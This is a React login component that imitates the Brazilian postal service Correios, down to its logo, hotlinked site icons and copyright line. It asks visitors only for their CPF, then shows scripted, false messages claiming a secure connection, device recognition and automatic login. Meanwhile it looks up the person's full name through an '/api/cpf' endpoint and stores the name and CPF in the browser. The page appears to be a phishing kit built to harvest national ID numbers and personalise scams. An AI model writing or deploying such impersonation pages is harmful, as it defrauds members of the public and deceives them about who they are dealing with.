import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ArrowLeft, Loader2, CheckCircle } from "lucide-react";
import logoEct from "@/assets/logo-ect.svg";

const Login = () => {
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [loginStep, setLoginStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [isCPFValid, setIsCPFValid] = useState(false);
  const [showCPFError, setShowCPFError] = useState(false);

  // Função para validar CPF
  const validateCPF = (cpf: string) => {
    // Remove caracteres não numéricos
    const numbers = cpf.replace(/\D/g, '');
    
    // Verifica se tem 11 dígitos
    if (numbers.length !== 11) return false;
    
    // Verifica se todos os dígitos são iguais
    if (/^(\d)\1{10}$/.test(numbers)) return false;
    
    // Validação do primeiro dígito verificador
    let sum = 0;
    for (let i = 0; i < 9; i++) {
      sum += parseInt(numbers[i]) * (10 - i);
    }
    let remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(numbers[9])) return false;
    
    // Validação do segundo dígito verificador
    sum = 0;
    for (let i = 0; i < 10; i++) {
      sum += parseInt(numbers[i]) * (11 - i);
    }
    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(numbers[10])) return false;
    
    return true;
  };

  // Função para formatar CPF
  const formatCPF = (value: string) => {
    // Remove tudo que não é número
    const numbers = value.replace(/\D/g, '');
    
    // Aplica a formatação XXX.XXX.XXX-XX
    if (numbers.length <= 3) {
      return numbers;
    } else if (numbers.length <= 6) {
      return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
    } else if (numbers.length <= 9) {
      return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
    } else {
      return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`;
    }
  };

  // Função para lidar com mudanças no input
  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const formatted = formatCPF(value);
    setUsername(formatted);
    
    // Valida o CPF quando estiver completo
    if (formatted.length === 14) {
      const isValid = validateCPF(formatted);
      setIsCPFValid(isValid);
      setShowCPFError(!isValid);
    } else {
      setIsCPFValid(false);
      setShowCPFError(false);
    }
  };

    const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validar se o campo está preenchido
    if (!username.trim()) {
      return; // Não faz nada se o campo estiver vazio
    }
    
    setIsLoading(true);

    // Primeiro: animação no botão por 2,5 segundos
    setTimeout(() => {
      setShowLoginModal(true);
      setLoginStep(0);
      setProgress(0);

      // Simular processo de login com diferentes etapas
      const steps = [
        { step: 0, message: "Acessando Sistema", subMessage: "Estabelecendo conexão segura...", duration: 2000 },
        { step: 1, message: "Dispositivo Reconhecido", subMessage: "Este dispositivo já foi usado anteriormente. Fazendo login automaticamente...", duration: 2000 },
        { step: 2, message: "Login Automático Realizado", subMessage: "Login efetuado com sucesso! Seu dispositivo já era conhecido pelo sistema.", duration: 2000 },
        { step: 3, message: "Acesso Confirmado", subMessage: "Redirecionando para sua área...", duration: 1500 }
      ];

      let currentStep = 0;
      const totalSteps = steps.length;

      const runStep = () => {
        if (currentStep < totalSteps) {
          const step = steps[currentStep];
          setLoginStep(step.step);
          setProgress(((currentStep + 1) / totalSteps) * 100);
          
          setTimeout(() => {
            currentStep++;
            runStep();
          }, step.duration);
                } else {
          // Finalizar processo e consultar API
          setTimeout(async () => {
            setIsLoading(false);
            
            try {
                // Consultar API para obter o nome do CPF
                const cpfNumbers = username.replace(/\D/g, '');
                console.log('Consultando API para CPF:', cpfNumbers);
                
                const response = await fetch(`/api/cpf?cpf=${cpfNumbers}`, {
                  method: 'GET',
                });
                
                let fullName = 'Usuário'; // Nome padrão
                
                console.log('Status da resposta:', response.status);
                console.log('Headers da resposta:', Object.fromEntries(response.headers.entries()));
                
                if (response.ok) {
                  const responseText = await response.text();
                  console.log('Resposta bruta da API:', responseText);
                  
                  let data;
                  try {
                    data = JSON.parse(responseText);
                    console.log('Dados da API (JSON):', data);
                    console.log('Tipo de dados:', typeof data);
                    console.log('Campos disponíveis na API:', Object.keys(data));
                    
                    // Pegar o nome da resposta da API
                    if (data.Nome) {
                      fullName = data.Nome;
                      console.log('Nome encontrado em data.Nome:', fullName);
                    } else {
                      console.log('Campo "Nome" não encontrado. Estrutura completa:', JSON.stringify(data, null, 2));
                    }
                    
                    console.log('Nome final obtido da API:', fullName);
                  } catch (parseError) {
                    console.error('Erro ao fazer parse da resposta JSON:', parseError);
                    console.log('Resposta não é JSON válido:', responseText);
                  }
                } else {
                  console.log('API retornou erro:', response.status, response.statusText);
                  const errorText = await response.text();
                  console.log('Texto do erro:', errorText);
                }
              
              // Pegar apenas primeiro e segundo nome
              const nameParts = fullName.split(' ');
              const userName = nameParts.length >= 2 ? `${nameParts[0]} ${nameParts[1]}` : fullName;
              
              // Salvar o nome no localStorage
              localStorage.setItem('userName', userName);
              localStorage.setItem('userCPF', cpfNumbers);
              
              console.log('Dados salvos no localStorage:', { userName, cpfNumbers });
              console.log('Verificando localStorage após salvar:', {
                userName: localStorage.getItem('userName'),
                userCPF: localStorage.getItem('userCPF')
              });
              
              // Disparar evento customizado para atualizar o Header
              const loginEvent = new CustomEvent('userLogin', {
                detail: { userName, cpfNumbers }
              });
              window.dispatchEvent(loginEvent);
              console.log('Evento userLogin disparado:', loginEvent);
              
              // Forçar atualização do Header de múltiplas formas
              window.dispatchEvent(new StorageEvent('storage', {
                key: 'userName',
                newValue: userName,
                oldValue: null
              }));
              
              console.log('Redirecionando para página inicial...');
              // Fechar modal e redirecionar para a página inicial
              setShowLoginModal(false);
              navigate('/', { replace: true });
              
            } catch (error) {
              console.error('Erro ao consultar API:', error);
              // Em caso de erro, usar nome padrão
              const cpfNumbers = username.replace(/\D/g, '');
              localStorage.setItem('userName', 'Usuário');
              localStorage.setItem('userCPF', cpfNumbers);
              
              // Disparar evento customizado
              window.dispatchEvent(new CustomEvent('userLogin', {
                detail: { userName: 'Usuário', cpfNumbers }
              }));
              
              // Fechar modal e redirecionar para a página inicial
              setShowLoginModal(false);
              navigate('/', { replace: true });
            }
          }, 1000);
        }
      };

      runStep();
    }, 2500); // 2,5 segundos de animação no botão
    
    console.log("Login:", { username });
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="w-full">
        {/* Main header - Light beige background */}
        <div className="bg-[#f5f3f0] py-4">
          <div className="container mx-auto px-4 flex items-center justify-center relative">
            {/* Back button - Left side */}
            <Button
              variant="ghost"
              size="sm"
              className="p-2 text-blue-600 hover:bg-blue-50 absolute left-4"
              onClick={() => window.history.back()}
            >
              <ArrowLeft className="w-6 h-6" />
            </Button>

            {/* Correios Logo - Center */}
            <div className="flex items-center justify-center">
              <img 
                src={logoEct} 
                alt="Correios" 
                className="h-6 w-auto"
              />
            </div>
          </div>
        </div>
        
        {/* Yellow separator line */}
        <div className="w-full h-0.5 bg-yellow-400"></div>
      </header>

      {/* Main Content */}
      <div className="flex items-center justify-center px-4 flex-1 pt-8 pb-24 md:pb-28">
        <div className="w-full max-w-md">
          {/* Title */}
          <h1 className="text-xl font-bold text-gray-900 mb-8">
            Entre com seu CPF
          </h1>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* CPF Field */}
            <div>
              <label htmlFor="username" className="block text-sm font-medium text-gray-900 mb-2">
                CPF
              </label>
              <Input
                id="username"
                type="text"
                value={username}
                onChange={handleCPFChange}
                className={`w-full h-12 border rounded px-3 focus:outline-none ${
                  showCPFError 
                    ? 'border-red-500 focus:border-red-500' 
                    : 'border-gray-300 focus:border-blue-500'
                }`}
                placeholder="Digite seu CPF"
                maxLength={14}
                required
              />
              {showCPFError && (
                <p className="text-red-500 text-xs mt-1">*CPF inválido</p>
              )}
            </div>

            {/* Login Button */}
            <Button
              type="submit"
              className={`w-full h-12 font-medium text-lg tracking-wide ${
                isCPFValid 
                  ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                  : 'bg-gray-300 text-gray-500 cursor-not-allowed'
              }`}
              disabled={isLoading || !isCPFValid}
            >
              {isLoading ? (
                <>
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                  Entrando...
                </>
              ) : (
                "Entrar"
              )}
            </Button>


          </form>

          {/* Security Notice */}
          <div className="mt-8 text-center">
            <p className="text-sm text-gray-600 leading-relaxed">
              Por razões de segurança, por favor clique em Sair e feche o seu navegador quando terminar de acessar os serviços que precisam de autenticação!
            </p>
          </div>
        </div>
      </div>

      {/* Login Modal */}
      {showLoginModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg shadow-xl p-8 max-w-md w-full mx-4">
            {/* Logo */}
            <div className="flex justify-center mb-6">
              <img 
                src={logoEct} 
                alt="Correios" 
                className="h-8 w-auto"
              />
            </div>

            {/* Status Icon */}
            <div className="flex justify-center mb-6">
              {loginStep < 3 ? (
                <Loader2 className="w-8 h-8 text-gray-600 animate-spin" />
              ) : (
                <svg xmlns="http://www.w3.org/2000/svg" height="32px" viewBox="0 -960 960 960" width="32px" fill="#22c55e">
                  <path d="M382-240 154-468l57-57 171 171 367-367 57 57-424 424Z"/>
                </svg>
              )}
            </div>

            {/* Status Messages */}
            <div className="text-center mb-6">
              <h3 className="text-lg font-semibold text-gray-900 mb-2">
                {loginStep === 0 && "Acessando Sistema"}
                {loginStep === 1 && "Dispositivo Reconhecido"}
                {loginStep === 2 && "Login Automático Realizado"}
                {loginStep === 3 && "Acesso Confirmado"}
              </h3>
              <p className="text-sm text-gray-600">
                {loginStep === 0 && "Estabelecendo conexão segura..."}
                {loginStep === 1 && "Este dispositivo já foi usado anteriormente. Fazendo login automaticamente..."}
                {loginStep === 2 && "Login efetuado com sucesso! Seu dispositivo já era conhecido pelo sistema."}
                {loginStep === 3 && "Redirecionando para sua área..."}
              </p>
            </div>

            {/* Progress Bar */}
            <div className="w-full bg-gray-200 rounded-full h-1">
              <div 
                className="bg-blue-600 h-1 rounded-full transition-all duration-500 ease-out"
                style={{ width: `${progress}%` }}
              ></div>
            </div>
          </div>
        </div>
      )}

      {/* Error Toast Notification */}
      {showErrorPopup && (
        <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-red-500 text-white px-6 py-3 rounded-lg shadow-lg z-50 transition-all duration-300 ease-in-out mx-4">
          <div className="flex items-center gap-3">
            <div className="flex-shrink-0">
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="flex-1 min-w-0">
              <p className="font-medium whitespace-nowrap">CPF inválido.</p>
            </div>
            <button
              onClick={() => setShowErrorPopup(false)}
              className="flex-shrink-0 text-white hover:text-gray-200 transition-colors"
            >
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
              </svg>
            </button>
          </div>
        </div>
      )}
    {/* Footer */}
    <footer className="bg-yellow-400 py-8 mt-auto">
      <div className="container mx-auto px-4">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
          {/* Fale Conosco */}
          <div>
            <h3 className="text-base font-semibold text-gray-900 mb-3">Fale Conosco</h3>
            <ul className="space-y-2">
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/monitor.png" alt="" className="w-4 h-4" />
                  <span>Registro de Manifestações</span>
                </a>
              </li>
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/duvida.png" alt="" className="w-4 h-4" />
                  <span>Central de Atendimento</span>
                </a>
              </li>
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/negocios.png" alt="" className="w-4 h-4" />
                  <span>Soluções para o seu negócio</span>
                </a>
              </li>
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/duvida.png" alt="" className="w-4 h-4" />
                  <span>Suporte ao cliente com contrato</span>
                </a>
              </li>
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/ouvidoria.png" alt="" className="w-4 h-4" />
                  <span>Ouvidoria</span>
                </a>
              </li>
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/denuncia.png" alt="" className="w-4 h-4" />
                  <span>Denúncia</span>
                </a>
              </li>
            </ul>
          </div>

          {/* Sobre os Correios */}
          <div>
            <h3 className="text-base font-semibold text-gray-900 mb-3">Sobre os Correios</h3>
            <ul className="space-y-2">
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/identidade.png" alt="" className="w-4 h-4" />
                  <span>Identidade corporativa</span>
                </a>
              </li>
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/educa%C3%A7%C3%A3o.png" alt="" className="w-4 h-4" />
                  <span>Educação e cultura</span>
                </a>
              </li>
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/c%C3%B3digo%20%C3%A9tica.png" alt="" className="w-4 h-4" />
                  <span>Código de ética</span>
                </a>
              </li>
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/Transpar%C3%AAncia.png" alt="" className="w-4 h-4" />
                  <span>Transparência e prestação de contas</span>
                </a>
              </li>
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/cadeado.png" alt="" className="w-4 h-4" />
                  <span>Política de Privacidade e Notas Legais</span>
                </a>
              </li>
            </ul>
          </div>

          {/* Outros Sites */}
          <div>
            <h3 className="text-base font-semibold text-gray-900 mb-3">Outros Sites</h3>
            <ul className="space-y-2">
              <li>
                <a href="#" className="flex items-center gap-2 text-gray-700 hover:text-blue-600 transition-colors text-sm">
                  <img src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/loja%20correios.png" alt="" className="w-4 h-4" />
                  <span>Loja online dos Correios</span>
                </a>
              </li>
            </ul>
          </div>
        </div>

        {/* Copyright */}
        <div className="border-t border-gray-400 pt-6 text-center">
          <p className="text-gray-700 text-sm">
            © Copyright 2025 Correios
          </p>
        </div>
      </div>
    </footer>
    </div>
  );
};

export default Login;